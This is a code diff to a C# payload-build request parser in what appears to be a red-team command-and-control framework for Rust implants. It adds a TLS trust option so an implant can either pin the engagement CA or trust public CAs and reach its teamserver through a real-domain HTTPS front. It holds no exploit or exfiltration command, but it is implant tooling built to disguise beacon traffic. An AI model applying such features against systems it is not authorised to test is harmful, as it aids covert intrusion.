@@ -70,6 +70,17 @@ internal static class PayloadBuildRequestParser
         if (format == ArtifactFormat.Dll)
             return (null,
                 "The dll format is retired with the .NET implant; every Rust artifact is a native executable -- use 'exe' or 'aot'.");
+        // The TLS trust posture: 'pinned' (the default -- the engagement CA
+        // baked as the only root) or 'public' (a real-domain front whose
+        // certificate a public CA issued; the implant validates like an
+        // ordinary client). Public rides TLS fronts alone -- the dial must
+        // name an https address, because the posture only has meaning where
+        // a handshake happens.
+        var trust = body.Trust?.Trim().ToLowerInvariant();
+        if (string.IsNullOrEmpty(trust))
+            trust = "pinned";
+        if (trust is not ("pinned" or "public"))
+            return (null, "Trust must be 'pinned' (the default) or 'public'.");
 
         // The endpoint list is what the baked implant dials, so a malformed
         // entry must not reach the build: it would not fail there -- it would
@@ -97,6 +108,17 @@ internal static class PayloadBuildRequestParser
                         $"Each fallback endpoint must dial the front's own scheme family -- the '{endpoint.Value}' front walks {FamilyShapes(family)} fallbacks only, got '{fallback}'.");
             }
         }
+
+        // A public-trust posture needs a TLS dial to ride: the primary or any
+        // fallback must be https, where the front's publicly-trusted chain is
+        // presented (an operator-run edge in front of the teamserver holds
+        // the certificate for the real domain).
+        if (trust == "public"
+            && endpoint.Value?.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase) != true
+            && body.FallbackEndpoints?.Any(f =>
+                f.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase)) != true)
+            return (null,
+                "Trust 'public' rides TLS fronts -- the dial must name an https:// address (the real-domain front an operator-run edge terminates); leave Trust unset for the pinned CA.");
 
         // The contact mode rides the beacon profile into the artifact: stream
         // (persistent, interactive) or poll (low-and-slow contacts). A typo
@@ -151,7 +173,8 @@ internal static class PayloadBuildRequestParser
             new TargetProfile(body.TargetOs ?? "linux", body.TargetArch ?? "amd64"),
             // Non-null by construction: every resolution path either returns
             // a dial or an error, and the error returned above.
-            BuildTransport(body, endpoint.Value!, beacon.Value, ExportCaPem(ca)),
+            BuildTransport(body, endpoint.Value!, beacon.Value, ExportCaPem(ca),
+                trust == "public" ? TlsTrust.Public : TlsTrust.Pinned),
             ParseDuration(body.SleepSeconds, DefaultSleep),
             ParseDuration(body.JitterSeconds, DefaultJitter),
             body.KillDate,
@@ -388,7 +411,8 @@ internal static class PayloadBuildRequestParser
         Endpoints.PayloadEndpoints.BuildPayloadRequest body,
         string endpoint,
         string? beaconEndpoint,
-        string caPem)
+        string caPem,
+        TlsTrust tlsTrust)
     {
         var profile = new TransportProfile(
             endpoint,
@@ -399,6 +423,9 @@ internal static class PayloadBuildRequestParser
             BeaconEndpoint = beaconEndpoint,
             // The pinned teamserver CA rides every build.
             CaPem = caPem,
+            // Which roots the TLS dials trust: the CA above alone, or the
+            // public set for a real-domain front.
+            TlsTrust = tlsTrust,
         };
 
         if (!string.IsNullOrWhiteSpace(body.EnrollPath))
